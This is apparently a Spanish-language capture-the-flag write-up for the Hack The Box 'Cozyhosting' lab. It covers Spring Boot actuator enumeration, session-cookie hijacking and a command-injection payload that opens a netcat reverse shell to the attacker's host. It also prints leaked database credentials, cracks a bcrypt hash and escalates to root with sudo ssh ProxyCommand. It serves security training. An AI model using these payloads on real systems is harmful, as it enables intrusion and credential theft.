---
tags:
title: Cozyhosting - Easy (HTB)
permalink: /Cozyhosting-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p22,80 10.129.229.88                              
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-22 00:36 -0500
Nmap scan report for cozyhosting.htb (10.129.229.88)
Host is up (0.49s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.85 seconds
```

## Website 

La pagina web no tiene nada de nada.

![image-center](/assets/images/Pasted image 20251222023639.png)

### Login

Tiene un panel de `login`, en el cual inyecciones no tienen caso en esta ocasión.

![image-center](/assets/images/Pasted image 20251222023726.png)

### Feroxbuster enumeration

Enumerando directorios, veo el `admin`, pero sin embargo me pide autenticación, de la cual las credenciales no las tengo.

```bash
feroxbuster -u http://cozyhosting.htb -C 404,500 -x php
<SNIP>
404      GET        1l        2w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
204      GET        0l        0w        0c http://cozyhosting.htb/logout
200      GET       97l      196w     4431c http://cozyhosting.htb/login
401      GET        1l        1w       97c http://cozyhosting.htb/admin
200      GET       29l      174w    14774c http://cozyhosting.htb/assets/img/pricing-ultimate.png
200      GET       38l      135w     8621c http://cozyhosting.htb/assets/img/favicon.png
200      GET       29l      131w    11970c http://cozyhosting.htb/assets/img/pricing-free.png
200      GET       43l      241w    19406c http://cozyhosting.htb/assets/img/pricing-business.png
200      GET      295l      641w     6890c http://cozyhosting.htb/assets/js/main.js
200      GET       38l      135w     8621c http://cozyhosting.htb/assets/img/logo.png
200      GET       34l      172w    14934c http://cozyhosting.htb/assets/img/pricing-starter.png
200      GET       83l      453w    36234c http://cozyhosting.htb/assets/img/values-3.png
200      GET        7l     1222w    80420c http://cozyhosting.htb/assets/vendor/bootstrap/js/bootstrap.bundle.min.js
200      GET        1l      313w    14690c http://cozyhosting.htb/assets/vendor/aos/aos.js
200      GET        1l      218w    26053c http://cozyhosting.htb/assets/vendor/aos/aos.css
200      GET       79l      519w    40905c http://cozyhosting.htb/assets/img/values-2.png
200      GET       81l      517w    40968c http://cozyhosting.htb/assets/img/hero-img.png
200      GET       73l      470w    37464c http://cozyhosting.htb/assets/img/values-1.png
200      GET        1l      625w    55880c http://cozyhosting.htb/assets/vendor/glightbox/js/glightbox.min.js
200      GET     2397l     4846w    42231c http://cozyhosting.htb/assets/css/style.css
200      GET     2018l    10020w    95609c http://cozyhosting.htb/assets/vendor/bootstrap-icons/bootstrap-icons.css
200      GET       14l     1684w   143706c http://cozyhosting.htb/assets/vendor/swiper/swiper-bundle.min.js
200      GET        7l     2189w   194901c http://cozyhosting.htb/assets/vendor/bootstrap/css/bootstrap.min.css
200      GET      285l      745w    12706c http://cozyhosting.htb/
200      GET      285l      745w    12706c http://cozyhosting.htb/index
[###>----------------] - 89s    10436/60070   6m      found:24      errors:0      
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_cozyhosting_htb_-1766381990.state ...
[###>----------------] - 89s    10442/60070   6m      found:24      errors:0      
[###>----------------] - 89s    10366/60000   116/s   http://cozyhosting.htb/ 
[--------------------] - 0s         0/60000   -       http://cozyhosting.htb/admin
```

Si en la `url` cambio a una ruta cualquiera, como `/zs1n`, me sale el siguiente error.

![image-center](/assets/images/Pasted image 20251222025138.png)

Este error no es común, por lo que con una búsqueda en internet, me basto para saber que corre `Spring Boot` en la aplicación.

>`Spring Boot` es un `framework` de código abierto para Java que simplifica y acelera el desarrollo de aplicaciones empresariales y microservicios.

### Actuator endpoint

En mi caso al saber que es corre java por detrás, ya que la `cookie de session` lleva el nombre `JSESSIONID`, use un diccionario de `Java` para `Spring Boot`.

```bash
gobuster dir -u http://cozyhosting.htb -w /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt -t 200
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cozyhosting.htb
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/actuator             (Status: 200) [Size: 634]
/actuator/health      (Status: 200) [Size: 15]
/actuator/env/path    (Status: 200) [Size: 487]
/actuator/env/lang    (Status: 200) [Size: 487]
/actuator/env/home    (Status: 200) [Size: 487]
/actuator/env         (Status: 200) [Size: 4957]
/actuator/mappings    (Status: 200) [Size: 9938]
/actuator/sessions    (Status: 200) [Size: 48]
/actuator/beans       (Status: 200) [Size: 127224]
```

Y así descubrí un `endpoint` que en cualquiera de los archivos de `fuzzing` no se encuentra.

Si voy a esa ruta veo los mismos `endpoints` que encontré con `gobuster`.

![image-center](/assets/images/Pasted image 20251222025531.png)
### Cookie leakage

Si intercepto la petición con `Burpsuite` veo que en el endpoint `/sessions` esta la session del usuario `kanderson` con su cookie de sesion.

![image-center](/assets/images/Pasted image 20251222025617.png)

## Shell as app

Reemplazando la mía con la de el, puedo entrar al panel de admin.

![image-center](/assets/images/Pasted image 20251222030535.png)
### Command injection

Veo en la parte de abajo de la pagina, dos campos, en el cual parece que tengo que colocar un nombre de maquina, o en mi caso intente poner mi dirección `ip` y desde mi consola ponerme en escucha con `nc` para recibir la conexión con algún tipo de dato. Pero me salió el siguiente error.

![image-center](/assets/images/Pasted image 20251222030839.png)

Es acá cuando intente inyectar un comando, ya que se supone que la dirección que pone la verificar en algún comando de `bash`, validando que este en el `/etc/hosts` de la maquina.

![image-center](/assets/images/Pasted image 20251222030913.png)
### Ping
Pero sin embargo al enviar la petición me salió otro error mas.

![image-center](/assets/images/Pasted image 20251222030940.png)
 Por lo que envié la misma consulta a `Burpsuite` y fui jugando primero con el salto de linea, el cual represente en formato `url-encoded` y además el espacio `(%09)`, haciendo que envié un ping a mi maquina, ya que comandos como `id` o `whoami` no me daban un output claro, como si estuviese frente a una inyección de comandos a ciegas..
 
```bash
t%0aping%0910.10.17.19%09##
```

Como recibo las solicitudes contra mi maquina, ya ahi me envie una reverse shell a mi maquina.

```bash
tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
01:13:33.474294 IP cozyhosting.htb > 10.10.17.19: ICMP echo request, id 1, seq 1, length 64
01:13:33.474317 IP 10.10.17.19 > cozyhosting.htb: ICMP echo reply, id 1, seq 1, length 64
01:13:34.100442 IP cozyhosting.htb > 10.10.17.19: ICMP echo request, id 1, seq 2, length 64
```

```bash
t%0abusybox%09nc%0910.10.17.19%091337%09-e%09/bin/bash%09##
```

Y desde mi listener recibo la shell como el usuario `app`.

```bash
nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.229.88] 50794
whoami
app
```
## Shell as josh

Dentro del directorio `/app` veo un archivo `.jar` el cual no puedo descomprimir en el mismo directorio, por lo que envié una copia a `/dev/shm` y con `unzip` lo descomprimí, es ahí cuando en la ruta `/BOOT-INF/classes`, vi el archivos con las propiedades, y además con credenciales para una base de datos `PostgreSQL`.
### Credentials

```bash
app@cozyhosting:/dev/shm/BOOT-INF/classes$ cat application.properties 
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

Use las mismas para conectarme a la base de datos.

```bash
psql -h localhost -p 5432 -U postgres -d cozyhosting
```

Y con el comando `\dt` liste las tablas, donde vi la tablas `users`.

```bash
\dt
cozyhosting=# \dt
         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres
(2 rows)

cozyhosting=# select * from users;
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```
### Cracking password.

Metí ambos hashes en un archivos de los cuales solo pude recuperar una sola `password`.\

```bash
john hash -w=/usr/share/wordlists/rockyou.txt         
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (?)     
1g 0:00:00:37 0.09% (ETA: 13:10:46) 0.02680g/s 409.2p/s 486.4c/s 486.4C/s jack..justin07
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```
### Auth

Como el usuario `josh` es el unico, me conecte.

```bash
ssh josh@cozyhosting.htb                                                             
The authenticity of host 'cozyhosting.htb (10.129.229.88)' can't be established.
ED25519 key fingerprint is: SHA256:x/7yQ53dizlhq7THoanU79X7U63DSQqSi39NPLqRKHM
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'cozyhosting.htb' (ED25519) to the list of known hosts.
josh@cozyhosting.htb's password: 
<SNIP>
josh@cozyhosting:~$
```

```bash
josh@cozyhosting:~$ cat user.txt 
37ad7a7d4490178ce349efc6a1cf49c0
```
## Shell as root

Veo que tengo el privilegio de ejecutar `ssh` como el usuario `root`. 

```bash
josh@cozyhosting:~$ sudo -l
[sudo] password for josh: 
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```
### Shell

Por lo que acudí al manual del propio `ssh`, en donde vi el poder usar el parámetro `ProxyCommand` luego del `-o`, para poder ejecutar comandos en el propio equipo local (`Localhost`), haciendo asi que pueda convertir mi `bash` a una de `root`.

```bash
josh@cozyhosting:~$ sudo /usr/bin/ssh -o ProxyCommand='sh -c "sh 0<&2 1>&2"' localhost
# whoami
root
```

```bash
# cat /root/root.txt
648c6126da8a52a150ab562bc2285e01
```

`~Happy Hacking.`